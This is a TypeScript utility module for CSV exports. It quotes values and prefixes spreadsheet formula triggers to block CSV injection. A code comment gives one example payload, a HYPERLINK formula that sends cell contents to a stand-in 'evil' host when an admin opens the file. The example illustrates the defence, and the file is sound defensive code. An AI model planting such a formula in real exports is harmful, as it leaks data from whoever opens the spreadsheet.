/**
 * Shared CSV utilities — used by admin, partner, and member export routes.
 */

/**
 * Escape a value for CSV: wrap in quotes if it contains special chars,
 * and neutralize Excel/Sheets formula triggers. Values whose first
 * character is one of `=+-@\t\r` are prefixed with a single quote so
 * spreadsheet apps treat them as text, not a formula. Without this,
 * a member-supplied value like `=HYPERLINK("http://evil/?c="&A1,"x")`
 * executes when an admin opens the export.
 */
export function csvEscape(value: string): string {
  let v = value;
  if (v.length > 0 && /^[=+\-@\t\r]/.test(v)) {
    v = `'${v}`;
  }
  if (/[",\n\r]/.test(v)) return `"${v.replace(/"/g, '""')}"`;
  return v;
}

/** Turn a row of values into a CSV line. */
export function csvRow(values: (string | number | null | undefined)[]): string {
  return values.map((v) => csvEscape(String(v ?? ''))).join(',');
}

/** Build a complete CSV string from headers + data rows, with optional WorkforceAP branding header. */
export function buildCsv(
  headers: string[],
  rows: (string | number | null | undefined)[][],
  options?: { reportTitle?: string; notes?: string },
): string {
  const lines = [csvRow(headers), ...rows.map(csvRow)];
  const data = `${lines.join('\r\n')}\r\n`;

  if (!options?.reportTitle) return data;

  const date = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
  const brandingLines = [
    `# Workforce Advancement Project — ${options.reportTitle}`,
    `# workforceap.org | Generated: ${date}`,
    options.notes ? `# ${options.notes}` : null,
    '#',
  ]
    .filter(Boolean)
    .join('\r\n');

  return `${brandingLines}\r\n${data}`;
}

/** Format a Date as YYYY-MM-DD, or return fallback. */
export function csvDate(d: Date | null | undefined, fallback = ''): string {
  if (!d) return fallback;
  try {
    return d.toISOString().slice(0, 10);
  } catch {
    return fallback;
  }
}
